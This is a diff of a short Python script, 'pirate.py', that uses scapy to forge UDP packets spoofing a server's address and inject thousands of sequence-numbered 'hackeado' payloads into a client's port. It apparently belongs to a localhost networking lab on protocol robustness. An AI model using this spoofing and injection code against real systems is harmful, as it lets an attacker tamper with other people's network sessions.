@@ -1,25 +1,28 @@
 #!/usr/bin/python3
 import sys
-from scapy.all import UDP, IP, Raw, send, conf
+from scapy.all import UDP, IP, Raw, send, conf, sendp
 
+# command for running the script:
+# <client port> varies between clients
+# it is obtained from the s.getsockname() print in client terminal
+# sudo python3.12 pirate.py 127.0.0.1 1818 127.0.0.1 <client port>
 print(conf.route)
 
 def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
-    print(f"Pirate is attacking! Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")
+    print(f"Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")
 
     # range of seq nums
-    for seq_num in range(0, 1000):
+    # change start of interval accordingly
+    for seq_num in range(0, 5000):
         # hackeado fake payload
-        fake_payload = seq_num.to_bytes(2, 'big') + f"hackeado".encode()
+        fake_packet = seq_num.to_bytes(2, 'big') + f"hackeado\n".encode()
 
         # forged packet
-        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_payload)
+        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_packet)
 
         # sending forged packet
-        print(f"Injecting fake packet with sequence number {seq_num}")
-        send(pirate_packet, verbose=0)
-
-    print("Attack completed!")
+        print(f"Injecting fake packet with sequence number {seq_num} and payload {fake_packet}")
+        send(pirate_packet, verbose=0, iface="lo")
 
 
 if len(sys.argv) != 5:
